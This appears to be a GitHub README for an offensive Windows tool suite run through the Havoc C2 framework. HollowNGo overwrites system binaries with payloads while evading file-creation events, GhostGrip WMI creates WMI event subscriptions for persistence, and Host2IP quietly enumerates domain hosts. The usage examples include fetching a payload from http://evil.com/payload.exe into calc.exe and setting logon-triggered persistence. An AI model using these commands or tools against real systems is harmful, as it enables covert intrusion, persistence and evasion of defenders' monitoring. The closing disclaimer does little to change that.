<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/b825632945a7a26b496f8f9cf7cad4e87674cef8/examples/SHARP.png">
</div>
<div align="center">
	Welcome to SharpC4k3s
</div>
<br>

## Tool Suite
- **HollowNGo**
- **GhostGrip WMI**
- **Host2IP**

## HollowNGO
HollowNGo aims to avoid FileCreation Events by reading your payload as a byte array, compressing them, and converting the compressed bytes to base64 to a memorysteam. setting the target file stream length to 0, then the same encoding operation in reverse to write to the target file. There are a few options when running the tool as shown below.

#### Create compressed encoded binary data (This is expected to run on your dev box not the target)
**Usage:** HollowNGo.exe -encode <source.exe> -output <output.txt>
- **Example:** HollowNGo.exe C:\Users\User\Documents\MyEvil.Exe -output EvilB64.txt

#### Via data output from -encode option
**Usage:** HollowNGo.exe -source <base64_content> -target <target.exe>
- **Example:** dotnet inline-execute HollowNGo.exe -sourcelocal <EvilB64.Code> -target C:\Windows\System32\calc.exe

#### Via remote hosted file
**Usage:** UsageHollowNGo.exe -sourceremote <SourceURI> -target <target.exe>
- **Example:** dotnet inline-execute HollowNGo.exe -sourceremote http://evil.com/payload.exe -target C:\Windows\System32\calc.exe
<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/c674b6dd870ddc8f4c7601b8d9e18f0feec36381/examples/HollowNGo.png">
</div>
<div align="center">
	HollowNGo Havoc example
</div>
<br>

## GhostGrip WMI
GhostGrip WMI creates a WMIEventSubscription for your prefered event for persistence and execution method. Use HollowNGo prior to set up your executable to avoid FileCreation Events.

**Usage:** GhostGrip_WMI.exe -location <path_to_executable> -type <time/logon/eventcode> -execution <executiontype> -randomizename <true/false>
- **Example:** dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type eventcode -eventcode 4726 -execution direct -randomizename true
- **Example:** dotnet inline-exeucte GhostGrip_WMI.exe -location C:\Windows\System32\calc.exe -type logon -execution invoke-wmimethod -randomizename false
<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/77242f2d974647427e6df74a15df5de9512e4070/examples/GhostGrip_WMI.png">
</div>
<div align="center">
	GhostGrip WMI Havoc example
</div>
<br>

## Host2IP
Host2IP aims to be a little less noisy than SMB/ICMP scans to find hosts within a domain environment. Host2IP uses LDAP queries to get a list of hostnames, which are then resolved via DNS, achieved via slow/fast mode to control the network traffic rate. If your current process does not have not have the correct domain priviliges you will have to provide credentials.

**Usage:** Host2IP.exe -domain <domain_name> -mode <fast/slow> -auth <true/false> -user <username> -password <password>
- **Example:** dotnet inline-execute Host2IP.exe -domain target.local -mode fast -auth false
- **Example:** dotnet inline-execute Host2IP.exe -domain target.locol -mode slow -auth true -user TheRat -password pass123!
<div align="center">
	<img src="https://github.com/MrR4tC4k3/SharpC4k3s/blob/64cd688e35ab726ded7a11669a85463f3dfbd857/examples/Host2IP.png">
</div>
<div align="center">
	GhostGrip WMI Havoc example
</div>
<br>

### **Disclaimer:** These tools are not to be used for any unauthorized activity :)
